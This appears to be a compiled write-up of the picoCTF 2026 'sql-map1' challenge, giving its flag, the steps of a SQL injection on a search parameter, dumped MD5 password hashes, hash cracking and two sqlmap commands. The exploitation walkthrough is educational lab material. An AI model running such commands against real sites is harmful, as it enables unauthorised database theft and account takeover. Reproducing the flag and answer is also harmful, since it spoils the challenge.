# sql-map1

- **Category:** Web Exploitation
- **Difficulty:** Medium (per imattas; jameskaois unspecified)
- **Points:** 300 (per imattas writeup)
- **Author:** Imattas aka Zemi (imattas); jameskaois (secondary source with real flag)
- **Sources:**
  - https://raw.githubusercontent.com/imattas/Writeups/main/picoctf-2026/sql-map1/index.mdx (generic, no flag)
  - https://raw.githubusercontent.com/jameskaois/ctf-writeups/main/pico-ctf-2026/Sql%20Map%201/README.md (real writeup, has flag)

## FLAG
`picoCTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}`
(from jameskaois writeup)

## Attack / Technique
SQL Injection exploitation using automated tooling (sqlmap).

## Step-by-Step Solution (jameskaois — authentic)
1. Identify vulnerable parameter: search box parameter `q` in `/vuln.php` is SQL-injectable.
2. Enumerate database tables with sqlmap (discovers: flags, sqlite_sequence, users). DB is SQLite.
3. Extract user credentials — dump users table, obtaining password hashes for two accounts:
   - ctf-player: `7a67ab5872843b22b5e14511867c4e43`
   - admin: `5a9a79d9fa477ed163b89088681672c9`
4. Crack credentials: reverse the ctf-player MD5 hash via CrackStation.
5. Retrieve flag: log in with recovered credentials to access the flag.

## Exploit Commands
```bash
sqlmap -u "http://<HOST>:<PORT>/vuln.php?q=test" \
  --cookie="PHPSESSID=<SESSION>" -p q --batch --tables

sqlmap -u "http://<HOST>:<PORT>/vuln.php?q=test" \
  --cookie="PHPSESSID=<SESSION>" -p q -T users --dump --batch
```
(imattas generic version suggests `--dump-all`, `--forms`, `--level 3 --risk 2`, `--cookie`.)

## Challenge Files
No downloadable files; live web application (endpoint `/vuln.php`). Hosted on picoCTF play infrastructure.

## needs_docker
YES — running web service required (web application with /vuln.php).
